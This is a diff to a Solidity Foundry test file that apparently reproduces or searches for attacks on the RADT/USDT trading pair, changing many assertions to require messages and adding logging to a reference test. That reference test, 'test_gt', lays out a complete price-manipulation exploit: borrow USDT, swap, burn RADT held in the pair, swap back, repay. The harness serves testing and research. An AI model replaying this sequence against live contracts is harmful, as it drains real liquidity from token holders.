@@ -234,7 +234,7 @@ contract RADTDAOTest is Test, BlockLoader {
         swap_pair_attacker_usdt_radt(amt1, amt2);
         swap_pair_attacker_radt_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -254,7 +254,7 @@ contract RADTDAOTest is Test, BlockLoader {
         swap_pair_attacker_usdt_radt(amt2, amt3);
         swap_pair_attacker_radt_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -274,7 +274,7 @@ contract RADTDAOTest is Test, BlockLoader {
         burn_radt_pair(amt3);
         swap_pair_attacker_radt_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -292,7 +292,7 @@ contract RADTDAOTest is Test, BlockLoader {
         swap_pair_attacker_radt_usdt(amt1, amt2);
         swap_pair_attacker_usdt_radt(amt3, amt4);
         payback_radt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -312,7 +312,7 @@ contract RADTDAOTest is Test, BlockLoader {
         swap_pair_attacker_radt_usdt(amt2, amt3);
         swap_pair_attacker_usdt_radt(amt4, amt5);
         payback_radt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -332,7 +332,7 @@ contract RADTDAOTest is Test, BlockLoader {
         burn_radt_pair(amt3);
         swap_pair_attacker_usdt_radt(amt4, amt5);
         payback_radt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -356,7 +356,7 @@ contract RADTDAOTest is Test, BlockLoader {
         swap_pair_attacker_usdt_radt(amt5, amt6);
         swap_pair_attacker_radt_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -382,7 +382,7 @@ contract RADTDAOTest is Test, BlockLoader {
         swap_pair_attacker_usdt_radt(amt6, amt7);
         swap_pair_attacker_radt_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -408,7 +408,7 @@ contract RADTDAOTest is Test, BlockLoader {
         swap_pair_attacker_usdt_radt(amt6, amt7);
         swap_pair_attacker_radt_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -434,7 +434,7 @@ contract RADTDAOTest is Test, BlockLoader {
         swap_pair_attacker_usdt_radt(amt6, amt7);
         swap_pair_attacker_radt_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -460,7 +460,7 @@ contract RADTDAOTest is Test, BlockLoader {
         burn_radt_pair(amt7);
         swap_pair_attacker_radt_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -484,7 +484,7 @@ contract RADTDAOTest is Test, BlockLoader {
         swap_pair_attacker_radt_usdt(amt5, amt6);
         swap_pair_attacker_usdt_radt(amt7, amt8);
         payback_radt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -510,7 +510,7 @@ contract RADTDAOTest is Test, BlockLoader {
         swap_pair_attacker_radt_usdt(amt6, amt7);
         swap_pair_attacker_usdt_radt(amt8, amt9);
         payback_radt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -536,7 +536,7 @@ contract RADTDAOTest is Test, BlockLoader {
         swap_pair_attacker_radt_usdt(amt6, amt7);
         swap_pair_attacker_usdt_radt(amt8, amt9);
         payback_radt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -562,7 +562,7 @@ contract RADTDAOTest is Test, BlockLoader {
         swap_pair_attacker_radt_usdt(amt6, amt7);
         swap_pair_attacker_usdt_radt(amt8, amt9);
         payback_radt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -588,26 +588,39 @@ contract RADTDAOTest is Test, BlockLoader {
         burn_radt_pair(amt7);
         swap_pair_attacker_usdt_radt(amt8, amt9);
         payback_radt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 1000e18);
         borrow_usdt_owner(1000e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", usdt.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
+        );
         swap_pair_attacker_usdt_radt(
             usdt.balanceOf(attacker),
             pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", (radt.balanceOf(address(pair)) * 100) / 9);
         burn_radt_pair((radt.balanceOf(address(pair)) * 100) / 9);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", radt.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            pair.getAmountOut(radt.balanceOf(attacker), address(radt))
+        );
         swap_pair_attacker_radt_usdt(
             radt.balanceOf(attacker),
             pair.getAmountOut(radt.balanceOf(attacker), address(radt))
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", (1000e18 * 1003) / 1000);
         payback_usdt_owner((1000e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -630,7 +643,7 @@ contract RADTDAOTest is Test, BlockLoader {
         burn_radt_pair(amt3);
         swap_pair_attacker_radt_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
